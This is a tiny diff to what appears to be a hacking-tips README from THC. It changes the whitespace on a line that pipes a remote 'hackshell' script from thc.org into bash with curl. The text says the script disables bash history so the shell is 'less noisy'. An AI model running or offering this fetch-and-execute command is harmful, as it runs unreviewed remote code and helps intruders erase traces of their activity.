@@ -119,7 +119,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
 
 Make BASH less noisy. Disables *~/.bash_history* and [many other things](tools/hackshell.sh).
 ```sh
-source <(curl -SsfL https://thc.org/hs)
+ source <(curl -SsfL https://thc.org/hs)
 ```
 
 It does much more but most importantly this:
